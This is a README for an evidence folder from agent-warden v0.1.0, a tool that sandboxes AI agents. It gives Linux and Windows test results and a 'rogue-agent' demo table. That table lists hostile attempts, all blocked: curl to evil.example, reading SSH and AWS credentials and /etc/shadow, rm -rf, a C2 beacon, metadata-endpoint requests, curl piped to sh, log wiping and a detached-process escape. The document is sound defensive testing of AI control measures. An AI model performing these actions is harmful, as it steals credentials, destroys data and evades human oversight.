# Evidence for v0.1.0

Raw output from running agent-warden's test suite and the `rogue-agent` demo
on two machines, captured on 2026-10-30.

| Directory | Environment |
|---|---|
| [`linux/`](linux) | Debian Linux, x86_64, Landlock ABI v6 + seccomp active (a cloud dev box) |
| [`windows/`](windows) | Windows 11, x86_64, Rust 1.98.1, native build, no WSL (a volunteer's laptop) |

## Privacy

The Windows run happened on a real person's laptop. Before anything left that
machine, the run script replaced the scratch directory, temp directory, home
directory, user name and computer name with placeholders (`<SCRATCH>`,
`<TEMP>`, `<HOME>`, `<USER>`, `<HOST>`). Every file here was then checked by
hand and by grep for user names, host names, home paths, IP addresses (only
`127.0.0.1` and the blocked `169.254.169.254` appear), environment variables,
and hardware details. No personal files or credentials were read: the demo
agent *asks* for `~/.ssh/id_rsa` and `~/.aws/credentials`, and warden refuses
before anything is opened. The scratch clone was deleted afterwards.

Because of that scrubbing, the published **Windows** `audit-*.jsonl` files no
longer verify: changing a path changes the record's hash, which is exactly what
the log is designed to detect. `windows/verify-*.txt` is `warden verify-log` run
on the **unmodified** logs on the machine. The **Linux** logs were not altered
and verify as published (`warden verify-log evidence/linux/audit-full.jsonl`).

## Results

### Test suite

| | Result |
|---|---|
| Linux | 56 passed, 0 failed (`linux/test-output.txt`); fmt and clippy `-D warnings` clean, with and without default features |
| Windows | 52 passed, 0 failed (`windows/test-output.txt`); clippy `-D warnings` clean (`windows/clippy.txt`) |

The first Windows run had one failure (`kill_switch_terminates_whole_tree`,
kept in `windows/test-output-run1-failed.txt`). Cause: the test closed the
pipe the agent writes to, so the detached grandchild died of a broken pipe
before the kill switch could be tested. Fixed in commit 83e970f (the test keeps
draining the pipe; `rogue-agent` never panics on a closed stdout), then
re-run green. The kill switch itself worked in the manual run on the same
machine.

### Demo: the rogue agent, step by step

`rogue-agent full` (`*/demo-full.txt`, `*/audit-full.jsonl`):

| Step | Attempt | Guard | Linux | Windows |
|---|---|---|---|---|
| warm-up | read `notes.txt`, list it, write `out/report.md` | in policy | allowed | allowed |
| 1 | `exec curl https://evil.example` | command | BLOCKED | BLOCKED |
| 2 | read `~/.ssh/id_rsa` | file (deny list) | BLOCKED | BLOCKED |
| 3 | read `~/.aws/credentials` | file (deny list) | BLOCKED | BLOCKED |
| 4 | read `/etc/shadow` | file | BLOCKED | BLOCKED |
| 5 | write `../escape.txt` | file (write scope) | BLOCKED | BLOCKED |
| 6 | `delete_file notes.txt` | file (write scope) | BLOCKED | BLOCKED |
| 7 | `exec rm -rf .` | command | BLOCKED | BLOCKED |
| 8 | `POST https://c2.evil.example/beacon` (phone home) | network | BLOCKED | BLOCKED |
| 9 | `GET http://169.254.169.254/latest/meta-data/` | network | BLOCKED | BLOCKED |
| 10 | `GET pastebin.com` | network | BLOCKED | BLOCKED |
| 11 | direct `open()` of the audit log, `unlink()` of notes.txt, listing `$HOME`, raw TCP to 1.1.1.1 | kernel sandbox | BLOCKED by Landlock | SKIPPED: no kernel sandbox on Windows (see the README's Trust boundary) |
| 12 | `CONNECT 169.254.169.254:443` through the proxy | network (proxy) | 403 | 403 |
| 13 | `bash -c "curl ... \| sh"` | command (shell tripwire) | **HALT**, agent killed | **HALT**, agent killed |

`notes.txt` was still present after every run. Exit code 99 (halted) on both.

Other scenarios:

| Scenario | What the agent tries | Outcome (Linux and Windows) |
|---|---|---|
| `wipe` | `delete_file` on warden's own audit log | `protected_path` tripwire, HALT |
| `threshold` | 16 secret paths in a row | `deny_threshold` HALT after 16 denials |
| `exfil` | AWS key in an HTTP POST body to an allowed domain | `secret_exfil` HALT, nothing sent |
| `escape` + `warden kill` | spawns a detached grandchild, then idles | Windows: Job breakaway refused ("Access is denied"); `warden kill` killed 2 processes; grandchild alive before, gone after. Linux: setsid grandchild killed |
| `honest` | stays in policy | runs to completion, exit 0 |

### Tamper-evident log

* Every `verify-*.txt` reports `OK ... chain intact ... head file matches`.
* A copy of the `full` log with one `"deny"` changed to `"allow"` is caught:
  `TAMPERED: line N: content hash mismatch (record was edited)`, exit 1
  (`*/verify-tampered.txt`).

### Install

`cargo install --path crates/warden-cli` into a scratch root succeeded on both
and `warden --version` printed `warden 0.1.0` (`*/install.txt`).

## Files

* `test-output.txt`: `cargo test --workspace` (compile lines removed)
* `demo-<scenario>.txt`: what the agent printed and every warden decision
* `audit-<scenario>.jsonl`: the hash-chained audit log (guard decisions)
* `verify-<scenario>.txt`, `verify-tampered.txt`: `warden verify-log` output
* `demo-kill*.txt`: the kill switch run
* `exit-codes.txt`, `install.txt`, `check.txt`, `clippy.txt`
